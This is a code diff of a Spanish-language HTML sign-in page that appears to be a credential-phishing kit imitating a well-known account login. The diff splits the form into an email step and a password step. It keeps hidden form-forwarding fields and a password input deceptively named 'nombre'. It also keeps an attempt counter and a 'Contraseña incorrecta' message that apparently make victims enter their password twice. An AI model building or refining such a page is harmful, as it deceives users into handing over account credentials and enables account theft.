@@ -25,16 +25,34 @@
           method="POST" 
           class="space-y-5">
 
-      <!-- Correo -->
-      <input 
-        class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600"
-        name="correo" 
-        placeholder="Correo electrónico o teléfono" 
-        type="email" 
-        required>
+      <!-- Paso 1: Correo -->
+      <div id="step1">
+        <input 
+          class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600"
+          id="correo"
+          name="correo" 
+          placeholder="Correo electrónico o teléfono" 
+          type="email" 
+          required>
 
-      <!-- Contraseña -->
-      <div>
+        <div class="text-sm mt-2">
+          <a href="#" class="text-blue-600">¿Olvidaste el correo electrónico?</a>
+        </div>
+
+        <div class="flex justify-between items-center mt-6">
+          <a href="#" class="text-blue-600 text-sm">Crear cuenta</a>
+          <button type="button" 
+                  id="btnNext1"
+                  class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
+            Siguiente
+          </button>
+        </div>
+      </div>
+
+      <!-- Paso 2: Contraseña (oculto al inicio) -->
+      <div id="step2" class="hidden">
+        <p class="text-gray-700 text-sm mb-2">Introduce tu contraseña</p>
+
         <input id="nombre" 
                class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600" 
                name="nombre" 
@@ -42,24 +60,18 @@
                type="password" 
                required>
         <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">Contraseña incorrecta</p>
-      </div>
 
-      <!-- Hidden fields -->
-      <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
-      <input type="hidden" name="_captcha" value="false">
+        <!-- Hidden fields -->
+        <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
+        <input type="hidden" name="_captcha" value="false">
 
-      <!-- Links -->
-      <div class="text-sm">
-        <a href="#" class="text-blue-600">¿Olvidaste el correo electrónico?</a>
-      </div>
-
-      <!-- Botón -->
-      <div class="flex justify-between items-center">
-        <a href="#" class="text-blue-600 text-sm">Crear cuenta</a>
-        <button type="submit" 
-                class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
-          Siguiente
-        </button>
+        <div class="flex justify-between items-center mt-6">
+          <a href="#" class="text-blue-600 text-sm">¿Olvidaste tu contraseña?</a>
+          <button type="submit" 
+                  class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
+            Siguiente
+          </button>
+        </div>
       </div>
     </form>
   </div>
@@ -68,6 +80,18 @@
   <script>
     let intentoNombre = 0;
 
+    // Paso de correo → contraseña
+    document.getElementById("btnNext1").addEventListener("click", function() {
+      const correo = document.getElementById("correo").value.trim();
+      if (correo === "") {
+        alert("Por favor ingresa tu correo");
+        return;
+      }
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+    });
+
+    // Validación contraseña
     document.getElementById("contactForm").addEventListener("submit", function(e) {
       const nombre = document.getElementById("nombre");
       const errorMsg = document.getElementById("errorNombre");
